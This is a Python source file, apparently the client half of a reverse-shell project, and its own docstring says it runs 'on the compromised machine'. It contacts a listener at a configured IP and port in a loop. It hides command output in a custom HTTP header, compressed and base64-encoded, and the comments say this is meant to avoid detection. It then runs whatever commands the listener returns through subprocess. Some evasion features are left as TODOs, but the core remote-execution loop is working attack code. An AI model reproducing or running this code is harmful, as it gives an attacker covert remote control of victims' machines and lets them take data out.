'''
Executes on the compromised machine. A reverse shell that communicates with the listener over HTTP.
'''

import requests
import base64
import os
import subprocess
import zlib
from utils import LISTENER_IP, LISTENER_PORT, STEGO_HEADER_NAME

# Time in seconds to wait for a http response before a timeout occurs.
# This time should be long, to give user ample time to input their commands into the listener. 
REQUEST_TIMEOUT = 300
# The URL of the listener
LISTENER_ROOT_URL = f'http://{LISTENER_IP}:{LISTENER_PORT}'

def get_random_url():
    '''
    Generate a randomised url to visit a page on the listener's webserver.
    (because it'd look suspicious if the client kept requesting the exact same page)

    Return:
        str: The random url
    '''
    # TODO: insert code here
    # For now, just return the root url.
    return LISTENER_ROOT_URL

def compress_and_encode_string(string: str):
    '''
    Compresses the given string to reduce size of packets sent (reducing chance of detection). 
    Then, encodes the string such that it can be stored in the HTTP header (HTTP headers don't allow some characters), and also for obfuscation purposes.
    
    Arguments:
        string (str): String to be compressed and encoded

    Returns:
        str: The resultant string
    '''
    # TODO: if compressed form is LARGER, send uncompressed form, and indicate so

    # If string is empty, no need to compress/encode it.
    if (len(string) == 0):
        return ""

    # TEMPORARY (prints size of string before and after compression)
    print(str(len(string.encode('utf-8'))) + " --> " + str(len(zlib.compress(string.encode('utf-8')))))
    # Compress the string
    compressed_bytes = zlib.compress(string.encode('utf-8'))
    # Encode the compressed data using Base64 
    encoded_string = base64.b64encode(compressed_bytes).decode('utf-8')
    return encoded_string

def send_stego_data_to_listener(data: str):
    '''
    Sends the given data to the listener using header steganography in a HTTP request,
    then waits for the listener's HTTP response and returns it.

    Arguments:
        data (str): String data to send to the listener via a HTTP request. Before sending, the string is compressed and encoded.
    
    Returns:
        str: Reply string found within the listener's HTTP response.
    '''
    # # Send the data as part of the HTTP header
    headers = {
        STEGO_HEADER_NAME: compress_and_encode_string(data)
    }
    url = get_random_url()
    response = None
    # Keep attempting to request the listener until a response is received.
    while (response is None):
        try:
            response = requests.get(url, headers=headers, timeout=REQUEST_TIMEOUT)
        except:
            continue
    # for now, listener reply is simply stored in the response text
    # TODO: store it via image steganoraphy
    return response.text

def execute_command_line_input(input: str):
    '''
    Executes the given input as command-line input on the system, returns output.
    This is used for the reverse shell.

    Arguments:
        input (str): Command-line input to be executed on the system (e.g. 'ls -la')

    Returns:
        str: The command-line output from executing the input
    '''
    # TODO: change this copied logic
    split_input = input.split()
    if split_input[0].lower() == "cd":
        # Need to handle 'cd' manually, cannot use `subprocess` library
        try:
            # Change directory
            os.chdir(' '.join(split_input[1:]))
            output = os.getcwd()
        except FileNotFoundError as e:
            output = str(e)
    else:
        # Execute the command and retrieve the output (might be an error message if command couldn't execute)
        output = subprocess.getoutput(input)
        print(f"OUTPUT: {output}")
    return output

def main():
    # First message to listener contains the current working directory.
    command_line_output = os.getcwd()
    while (True):
        '''
        1. Client sends command-line output to listener (http request)
        2. Listener sends command-line input to client (http response)
        3. repeat
        '''
        command_line_input = send_stego_data_to_listener(command_line_output)
        command_line_output = execute_command_line_input(command_line_input)

if __name__ == '__main__':
    main()